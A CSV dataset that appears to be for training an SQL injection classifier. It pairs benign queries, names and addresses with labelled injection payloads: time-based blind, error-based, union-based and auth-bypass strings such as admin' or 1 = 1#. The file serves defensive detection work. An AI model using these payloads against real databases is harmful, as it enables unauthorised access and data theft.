Query,Label
1' ) where 8142 = 8142 waitfor delay '0:0:5'--,1
"1"" ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""smnw"" like ""smnw",1
-2432' ) ) or ( 8459 = 8459 ) *4906 and ( ( 'ejhp' = 'ejhp,1
SELECT * FROM compound WHERE little = 'itself' FETCH FIRST 3 ROWS ONLY,0
"-1558 or elt ( 3306 = 2272,2272 ) -- ioxt",1
"1%' ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = '",1
SELECT * FROM origin WHERE bridge = 'sport',0
"-4522"" ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""mbkq"" = ""mbkq",1
"1"" ) ) union all select null#",1
olaf,0
lu,0
"SELECT somewhere,list,up FROM log LEFT JOIN Orders ON income.pieID = later.disappear ORDER BY summer.coast",0
SELECT AVG ( stomach ) FROM another SELECT SUM ( layers ),0
"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 'qutm' = 'qutm",1
"1 ) ) ) union all select null,null--",1
"SELECT column_name ( s ) FROM hide,threw",0
"SELECT mouse, desk, bat FROM apartment WHERE late IS NULL",0
UE1,1
"1'|| ( select 'eamo' where 4958 = 4958 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ) ||'",1
diafragmar,0
1%' ) ) and ( 3020 = 3020 ) *6703 and ( ( '%' = ',1
SELECT TOP 3 * FROM been,0
"end and ( ""nuix"" like ""nuix",1
3440,0
SELECT * FROM including WHERE Price NOT BETWEEN 10 AND 20,0
SELECT TOP 50 PERCENT * FROM bone,0
ilya,0
18995930t,0
"1"" ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""prtf"" like ""prtf",1
mohar@ropadegolf.gg,0
admin' or 1 = 1#,1
"1' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'tvcm' = 'tvcm",1
"SELECT MAKEDATE ( 2017, 366 ) ;",0
admin' OR '1'='1,1
beilul,0
SELECT AVG ( Price ) FROM left,0
"-8215%"" ) union all select 3877,3877,3877,3877,3877,3877--",1
8773,0
calle panaderas de san cecilio 168,0
SELECT * FROM porch WHERE Price NOT BETWEEN 10 AND 20,0
1'|| ( select 'lljg' from dual where 7631 = 7631,1
divinizacin,0
SELECT AVG ( greater ) FROM characteristic SELECT SUM ( interior ),0
SELECT cross ( s FROM nation RIGHT JOIN,0
"1 union all select null,null,null,null,null,null,null,null,null--",1
"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1
"1"" where 9632 = 9632 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1
"1%"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""%"" = """,1
28430,0
"SELECT * FROM raise WHERE person NOT IN ( 'ring', 'another', 'furniture' )",0
SELECT COUNT ( DISTINCT recent ) FROM mysterious,0
select ( case when ( 8233 = 1074 ) then 8233 else 1/ ( select 0 ) end ) --,1
"plaa gabriela mistral, 140",0
braschi_courtneidge@djbroadcast.an,0
select ( case when ( 2830 = 7046 ) then 2830 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1
maximiliano,0
SELECT * FROM system WHERE closer NOT BETWEEN 'smile' AND 'onto',0
-2790' ) ) or 8571 = 8571--,1
select case when 5433 = 6458 then 1 else null end--,1
SELECT DAYNAME ( CURDATE ( ) ) ;,0
"1"" where 8241 = 8241 union all select null,null,null#",1
sim5e469,0
"SELECT ProductName, UnitPrice * ( UnitsInStock + ISNULL ( UnitsOnOrder, 0 ) ) FROM Products;",0
SELECT * FROM alike WHERE science = 'made' OR zero = 'football',0
40560,0
SELECT * FROM Customers ORDER BY Country DESC;,0
"SELECT MID ( CustomerName, 2, 5 ) AS ExtractString FROM Customers;",0
SELECT * FROM carefully FETCH FIRST 3 ROWS ONLY,0
30666350j,0
"1"" ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ""hybu"" like ""hybu",1
SELECT * FROM most WHERE born NOT BETWEEN 'ear' AND 'afternoon',0
"-8021"" ) union all select 1166,1166,1166,1166--",1
"1%"" ) or sleep ( 5 ) and ( ""%"" = """,1
SELECT AVG ( decide ) FROM recently SELECT SUM ( classroom ),0
SELECT * FROM base ORDER BY symbol DESC,0
pari073l,0
morosa,0
"1"" where 2483 = 2483",1
35591968c,0
"1 or elt ( 6272 = 6272,sleep ( 5 ) )",1
SELECT * FROM born WHERE Price NOT BETWEEN 10 AND 20,0
cu2tre8a,0
1' ) ) order by 1#,1
"1 ) as wuio where 5312 = 5312 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
SELECT * FROM tax WHERE NOT move = 'probably' AND NOT neck = 'strange',0
tabanera de cerrato,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( 4142 = 4142",1
"1"" or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
golari,0
fischetti.bacall@players.com.gr,0
espineta astorquiza,0
SELECT * FROM mail WHERE wear NOT LIKE 'wrote%',0
SELECT COUNT ( possibly ) FROM rose,0
SELECT * FROM near WHERE NOT eager = 'body',0
"-8069 ) ) as sxbn where 7689 = 7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",1
SELECT TOP 3 * FROM tape WHERE earlier = 'told' SELECT * FROM behind,0
"1"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""dqis"" = ""dqis",1
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) +'",1
"1"" ) ) as lslk where 6729 = 6729 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
SELECT AVG ( choose ) FROM tube SELECT SUM ( judge ),0
"1%"" and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
SELECT TOP 3 * FROM village WHERE dirty = 'possible' SELECT * FROM minerals,0
neira umbert,0
"1 where 7522 = 7522 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1
1'|| ( select 'mlwj' from dual where 4247 = 4247 and 1702 = 8469 ) ||',1
hoefer.tabuyo@gopersonalfitness.nz,0
"-1072%"" ) ) or 3090 = 3539",1
SELECT captured ( s ) FROM or FULL OUTER JOIN,0
"1"" ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ""umfr"" like ""umfr",1
SELECT * FROM orange ORDER BY package DESC,0
"1'+ ( select syrz where 7699 = 7699 union all select null,null,null#",1
"1'|| ( select 'dpce' from dual where 5261 = 5261 union all select null,null,null,null,null,null--",1
"1 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
SELECT COUNT ( ProductID ) FROM Products;,0
"SELECT Orders.yourselfrID, Employees.hit, Employees.birthday FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.dutyID ORDER BY Orders.cabinID",0
"1 or elt ( 6272 = 6272,sleep ( 5 ) ) -- ilfc",1
19461,0
"SELECT guide, wonder, brief FROM lift WHERE outline IS NULL",0
"1%"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ""%"" = """,1
22532,0
SELECT TOP 3 * FROM mad SELECT * FROM dollar 3SELECT * FROM ruler,0
"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""fqeu"" like ""fqeu",1
SELECT AVG ( waste ) FROM expect,0
"select * from users where id = 1 or "";_"" or 1 = 1 -- 1",1
SELECT TOP 3 * FROM separate WHERE discover = 'solution' SELECT * FROM income,0
SELECT AVG ( Price ) FROM egg,0
"1"" ) ) as sqzh where 5672 = 5672 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
-4171' ) union all select 6136#,1
SELECT eager ( s ) FROM crew FULL OUTER JOIN,0
"-1015"" ) ) union all select 6624,6624#",1
"1',iif ( 7475 = 7475,1,1/0 )",1
SELECT wp_posts.* FROM wp_posts WHERE ID IN ( 367584 ),0
SELECT themselves FROM riding UNION ALL SELECT might FROM rose ORDER BY dangerous,0
46881104c,0
SELECT * FROM production WHERE bet = 'be' LIMIT 3,0
"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'iwkg' = 'iwkg",1
"UPDATE mental SET win = 'cake', City = 'afternoon' WHERE me = pull",0
"1%"" ) ) and 7358 = 6986--",1
SELECT * FROM can ORDER BY most DESC,0
SELECT * FROM snow WHERE search BETWEEN party09/01/1996stop AND hidden15/31/1996ourselves,0
"1%"" ) ) and 4595 = 4595#",1
2.72034E+15,0
"1"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""fbol"" like ""fbol",1
"1"" ) ) as rcse where 4559 = 4559 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",1
2ovi4in,0
( select 2412 = ( 'qqpjq'|| ( select case 2412 when 2412 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ),1
44392621e,0
"select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'",1
1 ) ) as hxzh where 9284 = 9284,1
"1 ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
SELECT COUNT ( excitedID ) FROM giant,0
rocco-misaki@soybueno.nz,0
SELECT * FROM system 3,0
1' and ( 5116 = 1602 ) *1602,1
kosanovic@discon.cg,0
SELECT option_value FROM wp_options WHERE option_name = 'site_logo' LIMIT 1,0
12230,0
-5062 ) where 7457 = 7457 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1
"SELECT Orders.parallelrID, Employees.was, Employees.volume FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.toID ORDER BY Orders.burstID",0
"SELECT mistake,fish,close FROM plates LEFT JOIN Orders ON meet.forgottenID = worried.attention ORDER BY angle.rocket",0
tomolillo@velazquezlarranaga.et,0
SELECT COUNT ( earID ) FROM leave,0
"plza. mirto, 135",0
1' ) as hqaq where 6411 = 6411 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1
alberite de san juan,0
sabety,0
jamaly,0
"-1422%"" ) or make_set ( 9539 = 9519,9519 ) and ( ""%"" = """,1
nanclares espejo,0
"SELECT prize, cold, lifeFROM tree WHERE throat IS NOT NULL",0
"-3729' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'czed' = 'czed",1
"1' union all select null,null,null--",1
SELECT mood FROM power,0
"1' ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1
44494,0
SELECT * FROM goose FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM policeman,0
"1%' ) ) and make_set ( 8403 = 8403,8899 ) and ( ( '%' = '",1
SELECT * FROM grandfather WHERE shop = 'wild' OR eaten = 'matter',0
"1"" ) ) as uqkn where 4642 = 4642 or elt ( 6272 = 6272,sleep ( 5 ) ) --",1
"-5661' ) ) union all select 3011,3011#",1
"rua bamio, 190 11?h",0
"SELECT column1 , column2, ... FROM table_name ORDER BY column1, column2, ... ASC|DESC;",0
"-9932"" union all select 4049,4049,4049--",1
eward,0
1' ) ) as vdhw where 8858 = 8858 order by 1#,1
"1"" ) ) as uels where 9447 = 9447 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1
1 where 3502 = 3502 order by 1--,1
askam@maxtienda.er,0
3.15402E+15,0
if ( 8727 = 4039 ) select 8727 else drop function giql--,1
"1%"" ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
SELECT * FROM most ORDER BY people,0
alcoy/alcoi,0
"1' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( 'obeh' = 'obeh",1
SELECT studied ( s ) FROM cat SELECT oil FROM composed,0
palmera,0
60996626m,0
select ( case when ( 4393 = 2875 ) then 1 else 4393* ( select 4393 from master..sysdatabases ) end ) --,1
SELECT * FROM typical,0
SELECT MIN ( safety ) AS ancient FROM present,0
1' ) ) ) rlike ( select ( case when ( 5524 = 9582 ) then 1 else 0x28 end ) ) and ( ( ( 'okoj' like 'okoj,1
duilio,0
SELECT master FROM jack,0
"SELECT * FROM problem WHERE factory IN ( 'close', 'hard', 'halfway' )",0
elysha,0
alegra-dulantzi,0
SELECT * FROM machinery 3 SELECT * FROM southern,0
"-8205' or elt ( 6581 = 3480,3480 ) and 'sosv' = 'sosv",1
select ( case when ( 8857 = 1512 ) then 8857 else 8857* ( select 8857 from mysql.db ) end ) #,1
"1' ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 'mttj' like 'mttj",1
-5585%' ) ) ) or 6990 = 7727,1
"-1894' ) union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",1
"SELECT zulu,nose,rising,move,leader ( ( courage JOIN did ON desk.shown = glad.wheat ) INNER JOIN somethingON Orders.shall = central.developID )",0
-6190' ) ) ) union all select 9413--,1
"1 ) where 7485 = 7485 and make_set ( 8403 = 8403,8899 ) --",1
"torremacana, 107 7e",0
"1%"" or sleep ( 5 ) #",1
alpar-ornstein@rockefeller.nu,0
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ""vabm"" = ""vabm",1
49180,0
8.51E+15,0
1' ) ) rlike ( select ( case when ( 6205 = 1384 ) then 1 else 0x28 end ) ) and ( ( 'ahjf' = 'ahjf,1
"1 ) and elt ( 7425 = 8842,8842 ) and ( 9194 = 9194",1
walborn@19horas.cat,0
SELECT COUNT ( trip ) FROM color,0
SELECT AVG ( motor ) FROM explore,0
1 ) as wshv where 5684 = 5684,1
SELECT Count ( * ) AS previous,0
"1' ) ) ) union all select null,null,null,null,null--",1
"SELECT * FROM signal WHERE fifteen BETWEEN ""fuel"" AND ""mother""",0
SELECT * FROM team WHERE corn = 'lose' LIMIT 3,0
SELECT AVG ( effect ) FROM light,0
"-1869"" ) ) ) union all select 7122,7122,7122,7122,7122,7122,7122,7122,7122--",1
1' ) and 7533 = 7533,1
-3956' ) or ( 8459 = 8459 ) *4906 and ( 'rflo' like 'rflo,1
kiam,0
"-8684 union all select 9519,9519,9519,9519--",1
"1"" ) and ( 3020 = 3020 ) *6703 and ( ""qowc"" like ""qowc",1
"SELECT * FROM broad ORDER BY took ASC, happened DESC",0
"1' in boolean mode ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
"select * from users where id = '1' union select "";""_,version ( ) -- 1'",1
"1' ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( 'ggiw' = 'ggiw",1
"1'|| ( select 'dbxr' where 4014 = 4014 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
select pg_sleep ( 5 ) and '%' = ',1
"-5640"" ) ) or 9792 = 2728--",1
lor81a5o,0
"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1
bugarra,0
SELECT MIN ( list ) AS enjoy FROM happened,0
"1%' and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
"1"" ) ) as dooi where 1806 = 1806 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
dasya4,0
SELECT * FROM place WHERE shape = 'opposite' OR charge = 'jump',0
"select count ( * ) from generate_series ( 1,5000000 ) and ( 'qpdu' = 'qpdu",1
"-5054%"" ) ) ) union all select 8263,8263,8263,8263--",1
SELECT * FROM outer WHERE headed = grain,0
"SELECT Orders.OrderID, Employees.LastName, Employees.FirstName FROM Orders RIGHT JOIN Employees ON Orders.EmployeeID = Employees.EmployeeID ORDER BY Orders.OrderID;",0
SELECT easy ( s ) FROM establish UNION,0
"1"" ) as ikdo where 4128 = 4128",1
SELECT * FROM definition,0
1 ) ) as pxmz where 2596 = 2596,1
jasmann,0
schiavelli@buscadordevideos.mk,0
1 ) as zodp where 9112 = 9112,1
"1%"" ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""%"" = """,1
"1"" where 3692 = 3692 union all select null,null--",1
SELECT whispered ( s ) FROM idea SELECT evening FROM beginning,0
UPDATE pour SET busy = 'sent'WHERE drawn = 'important',0
c/ txapin ene 162,0
luciano nagel,0
"1 ) ) as qzmg where 4344 = 4344 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",1
SELECT machine FROM pay UNION ALL SELECT mixture FROM ship ORDER BY fifty,0
"1"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""fpwu"" like ""fpwu",1
"-3666"" ) ) ) union all select 4136,4136,4136--",1
SELECT * FROM paper WHERE child IN ( SELECT triangle FROM list ),0
"SELECT * FROM cookies ORDER BY cut ASC, great DESC",0
"iif ( 2205 = 4764,1,1/0 )",1
1' ) and 2305 = 1934,1
"1' ) ) as jvwq where 6596 = 6596 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
-8828%' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( '%' = ',1
slavova@costablancarental.ug,0
-3186 or 3867 = 9405,1
"SELECT column_name ( s ) FROM usual,change",0
"1%' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and '%' = '",1
SELECT * FROM property WHERE unknown = 'outer' FETCH FIRST 3 ROWS ONLY,0
select ( case when ( 3855 = 3855 ) then 3855 else 1/ ( select 0 ) end ) --,1
"1'|| ( select 'neqi' where 6873 = 6873 union all select null,null,null,null,null,null,null--",1
"SELECT business,yes,class FROM pressure LEFT JOIN Orders ON slip.hereID = lovely.pocket ORDER BY husband.coach",0
"INSERT INTO we ( parts, held, gasoline ) VALUES ( 'diameter', 'police', 'doll' )",0
' AND (SELECT LEN(DB_NAME()))=9 --,1
end and 'icny' like 'icny,1
1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( 'mqoj' like 'mqoj,1
"SELECT COUNT ( near ) , light FROM whose BY person",0
SELECT * FROM sweet FETCH FIRST 50 PERCENT ROWS ONLY,0
"SELECT bone, paper+ ', ' + cookies+ ' ' + upper+ ', ' + meat AS bare FROM this",0
SELECT COUNT ( tent ) FROM practical,0
1%' rlike sleep ( 5 ) #,1
"1' ) ) union all select null,null,null,null,null,null,null,null--",1
"-8043%"" ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( ""%"" = """,1
SELECT * FROM six WHERE needs = 'pleasant' AND City = 'breathe',0
descrieres@enibiza.com.ac,0
select sleep ( 5 ) and ( 'dcys' like 'dcys,1
""" ) or true--",1
"-1844' ) union all select 9572,9572,9572,9572#",1
"UPDATE bark SET few = 'vapor', City = 'subject' WHERE alphabet = pretty",0
SELECT affect ( s ) FROM lunch INNER JOIN,0
novallas,0
"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) -- btqa",1
select ( case when ( 2676 = 4191 ) then 2676 else 1/ ( select 0 ) end ) --,1
samm@lawn.sn,0
"1"" ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ""ieuj"" like ""ieuj",1
"1'+ ( select 'ycsv' where 3628 = 3628 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
cholewin,0
end and ( ( ( 'nhub' = 'nhub,1
SELECT * FROM building WHERE saw IN ( SELECT general FROM lift ),0
SELECT TOP 3 * FROM flies,0
dobbing3,0
abordonar,0
capaz9,0
"1"" where 3329 = 3329 or sleep ( 5 ) --",1
"1"" where 9669 = 9669",1
rubio,0
20e28u6r,0
"SELECT TIME_FORMAT ( ""19:30:10"", ""%r"" ) ;",0
"INSERT INTO production ( trouble, personal, dish ) VALUES ( 'short', 'table', 'trunk' )",0
castrillo de la valduerna,0
SELECT AVG ( eight ) FROM simplest SELECT SUM ( space ),0
"1' ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 'ejnt' like 'ejnt",1
8.59153E+15,0
"-8256"" ) ) ) or 6872 = 6872 and ( ( ( ""lrtu"" = ""lrtu",1
"SELECT * FROM mountain WHERE recently BETWEEN ""tower"" AND ""sat""",0
"1' ) as jrwx where 6087 = 6087 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",1
"-9356 or elt ( 1032 = 1032,3623 ) -- izgi",1
"1%' and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and '%' = '",1
SELECT * FROM compare WHERE Price NOT BETWEEN 10 AND 20,0
SELECT surprise FROM stomach,0
SELECT * FROM parent FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM flight WHERE becoming BETWEEN 'copper' AND 'yard',0
"1 ) where 1185 = 1185 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1
"-5624' union all select 3723,3723,3723,3723,3723--",1
"1 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1
SELECT * FROM known WHERE layers = 'opinion' OR arrange = 'fed',0
SELECT * FROM express,0
cote suengas,0
SELECT * FROM instance WHERE planet BETWEEN 10 AND 20,0
abraham,0
amarjit,0
5.83899E+15,0
"c/ animas, 101,",0
n89m3nd2,0
"select * from users where id = 1. union select null,version ( ) -- 1",1
"1' where 7464 = 7464 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
SELECT Count ( * ) AS rain,0
-3084%' ) ) order by 1--,1
